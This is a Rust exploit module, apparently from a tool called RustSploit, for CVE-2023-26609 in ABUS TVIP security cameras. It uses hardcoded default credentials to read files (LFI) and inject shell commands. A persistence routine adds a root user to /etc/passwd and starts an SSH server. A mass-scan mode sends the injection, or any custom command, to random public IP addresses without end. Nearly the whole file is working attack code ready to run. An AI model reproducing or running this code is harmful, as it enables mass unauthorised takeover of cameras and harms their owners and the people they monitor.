// Exploit Title: ABUS Security Camera TVIP 20000-21150 - LFI, RCE and SSH Root Access
// CVE: CVE-2023-26609
// Author: d1g@segfault.net | Ported to Rust for RustSploit
// PoC converted 1:1 from Bash to async Rust logic

use anyhow::{anyhow, Result, Context};
use colored::*;
use md5;
use rand::Rng;
use reqwest::Client;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use std::time::Duration;
use std::io::{self, Write};
use tokio::io::AsyncWriteExt;
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use chrono::Local;
use crate::utils::normalize_target;

const DEFAULT_TIMEOUT_SECS: u64 = 10;
const MASS_SCAN_CONCURRENCY: usize = 100;
const MASS_SCAN_PORT: u16 = 80;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

#[derive(Clone, Copy, Debug)]
enum ScanMode {
    StandardCheck,
    CustomCommand,
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}


/// Send authenticated LFI request
async fn exploit_lfi(client: &Client, target: &str, filepath: &str) -> Result<()> {
    let host = normalize_target(target)?;
    let url = format!(
        "http://admin:admin@{}/cgi-bin/admin/fileread?READ.filePath={}",
        host, filepath
    );
    println!("{}", format!("[*] Sending LFI request to: {}", url).cyan());

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    
    if status.is_success() {
        println!("{}", format!("[+] Status: {}", status).green());
        println!("{}", "[+] Body:".green());
        println!("{}", body);
    } else {
        println!("{}", format!("[-] Status: {}", status).red());
        println!("{}", format!("[-] Body:\n{}", body).red());
    }
    Ok(())
}

/// Send authenticated RCE request with command injection
async fn exploit_rce(client: &Client, target: &str, cmd: &str) -> Result<()> {
    let host = normalize_target(target)?;
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=testname;{}",
        host, cmd
    );
    println!("{}", format!("[*] Sending RCE request to: {}", url).cyan());

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    
    if status.is_success() {
        println!("{}", format!("[+] Status: {}", status).green());
        println!("{}", "[+] Body:".green());
        println!("{}", body);
    } else {
        println!("{}", format!("[-] Status: {}", status).red());
        println!("{}", format!("[-] Body:\n{}", body).red());
    }
    Ok(())
}

/// Stage 1: Generate SSH key
async fn generate_ssh_key(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key";
    println!("{}", "[*] Stage 1: Generating SSH key on target...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Stage 2: Inject a root user with an MD5-hashed password
async fn inject_root_user(client: &Client, target: &str, password: &str) -> Result<()> {
    // Compute lowercase-hex MD5 of the provided password
    let hash = format!("{:x}", md5::compute(password));
    println!("{}", format!("[*] MD5 hash of password: {}", hash).cyan());

    // Build the echo command to append to /etc/passwd
    let cmd = format!(
        "echo%20d1g:{}:0:0:root:/:/bin/sh%20>>%20/etc/passwd",
        hash
    );
    println!("{}", "[*] Stage 2: Injecting root user into /etc/passwd...".yellow());
    exploit_rce(client, target, &cmd).await
}

/// Stage 3: Start Dropbear SSH server
async fn start_dropbear(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbear%20-E%20-F";
    println!("{}", "[*] Stage 3: Starting Dropbear SSH server...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Combined SSH persistence exploit
async fn persist_root_shell(client: &Client, target: &str, password: &str) -> Result<()> {
    generate_ssh_key(client, target).await?;
    inject_root_user(client, target, password).await?;
    start_dropbear(client, target).await?;
    println!("{}", "[+] Persistence complete! You can now SSH in with:".green().bold());
    println!(
        "{}",
        format!(
            "    sshpass -p '{}' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \\\n         -oHostKeyAlgorithms=+ssh-rsa d1g@{}",
            password, target
        ).cyan()
    );
    Ok(())
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ABUS Security Camera TVIP 20000-21150 Exploit           ║".cyan());
    println!("{}", "║   CVE-2023-26609 - LFI, RCE and SSH Root Access           ║".cyan());
    println!("{}", "║   Variant 1 - Multi-mode (LFI/RCE/Persistence)            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// Prompt user for mode, and dispatch accordingly
/// Prompt user for mode, and dispatch accordingly
async fn execute(target: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();
    println!("{}", "[*] Exploit mode selection:".cyan().bold());
    println!("  {} LFI (Local File Inclusion)", "[1]".green());
    println!("  {} RCE (Remote Code Execution)", "[2]".green());
    println!("  {} SSH Persistence (Full Compromise)", "[3]".green());
    print!("{}", "> ".cyan().bold());
    io::stdout().flush().context("Failed to flush stdout")?;

    let mut choice = String::new();
    io::stdin().read_line(&mut choice).context("Failed to read choice")?;
    match choice.trim() {
        "1" => {
            print!("{}", "Enter file path to read (e.g. /etc/passwd): ".cyan().bold());
            io::stdout().flush().context("Failed to flush stdout")?;
            let mut fp = String::new();
            io::stdin().read_line(&mut fp).context("Failed to read file path")?;
            exploit_lfi(&client, target, fp.trim()).await?;
        }
        "2" => {
            print!("{}", "Enter command to execute (e.g. id): ".cyan().bold());
            io::stdout().flush().context("Failed to flush stdout")?;
            let mut cmd = String::new();
            io::stdin().read_line(&mut cmd).context("Failed to read command")?;
            exploit_rce(&client, target, cmd.trim()).await?;
        }
        "3" => {
            // Ask for the desired password, hash it, and persist
            print!("{}", "Enter desired password for new root user: ".cyan().bold());
            io::stdout().flush().context("Failed to flush stdout")?;
            let mut pwd = String::new();
            io::stdin().read_line(&mut pwd).context("Failed to read password")?;
            let pwd = pwd.trim();
            if pwd.is_empty() {
                return Err(anyhow!("Password cannot be empty"));
            }
            persist_root_shell(&client, target, pwd).await?;
        }
        _ => {
            println!("{}", "[-] Invalid choice".red());
            return Err(anyhow!("Invalid choice"));
        }
    }

    Ok(())
}

/// Quick vulnerability check for mass scanning (no honeypot detection)
async fn quick_check(client: &Client, ip: &str, mode: ScanMode, custom_cmd: &str) -> bool {
    let host = format!("{}:{}", ip, MASS_SCAN_PORT);
    let cmd = if let ScanMode::CustomCommand = mode { custom_cmd } else { "id" };
    
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=testname;{}",
        host, cmd
    );
    
    match tokio::time::timeout(
        Duration::from_secs(5),
        client.get(&url).send()
    ).await {
        Ok(Ok(resp)) => resp.status().is_success(),
        _ => false,
    }
}

/// Mass scan mode - infinite random IP scanning
async fn run_mass_scan() -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Honeypot detection: DISABLED".yellow());
    println!("{}", format!("[*] Concurrency: {}", MASS_SCAN_CONCURRENCY).cyan());
    
    // Prompt for exclusions (FIRST)
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".cyan());
    io::stdout().flush()?;
    let mut excl_choice = String::new();
    io::stdin().read_line(&mut excl_choice)?;
    let use_exclusions = !matches!(excl_choice.trim().to_lowercase().as_str(), "n" | "no");

    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    // Prompt for Output File
    print!("{}", "[?] Output File (default: abus_hits.txt): ".cyan());
    io::stdout().flush()?;
    let mut outfile = String::new();
    io::stdin().read_line(&mut outfile)?;
    let outfile = outfile.trim();
    let outfile = if outfile.is_empty() { "abus_hits.txt" } else { outfile };
    let outfile = outfile.to_string();
    
    // Prompt for Payload Mode
    println!("{}", "[?] Select Payload Mode:".cyan());
    println!("    1. Standard Check (Command: id)");
    println!("    2. Custom Command");
    print!("{}", "Select option [1-2] (default 1): ".cyan());
    io::stdout().flush()?;
    let mut mode_str = String::new();
    io::stdin().read_line(&mut mode_str)?;
    let mode = match mode_str.trim() {
        "2" => ScanMode::CustomCommand,
        _ => ScanMode::StandardCheck,
    };
    
    let mut custom_cmd = String::new();
    if let ScanMode::CustomCommand = mode {
        print!("{}", "[?] Enter Custom Command: ".cyan());
        io::stdout().flush()?;
        std::io::stdin().read_line(&mut custom_cmd)?;
        custom_cmd = custom_cmd.trim().to_string();
    }
    let custom_cmd = Arc::new(custom_cmd);
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;
    let client = Arc::new(client);
    
    let semaphore = Arc::new(Semaphore::new(MASS_SCAN_CONCURRENCY));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));
    
    // Result writer channel
    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&outfile_clone)
            .await
            .expect("Failed to open output file");
            
        while let Some(result) = rx.recv().await {
            let _ = file.write_all(result.as_bytes()).await;
        }
    });

    // Stats reporter
    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });
    
    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let exc = exclusions.clone();
        let cl = client.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        let cc = custom_cmd.clone();
        let current_mode = mode;
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc);
            let ip_str = ip.to_string();
            
            if quick_check(&cl, &ip_str, current_mode, &cc).await {
                println!("{}", format!("[+] VULNERABLE: {}", ip_str).green().bold());
                fnd.fetch_add(1, Ordering::Relaxed);
                
                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                let log_entry = format!("{} - {}\n", ip_str, timestamp);
                let _ = tx.send(log_entry);
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}


/// Entry point for the RustSploit dispatch system
pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target.is_empty() || target == "random" {
        run_mass_scan().await
    } else {
        execute(target).await
    }
}
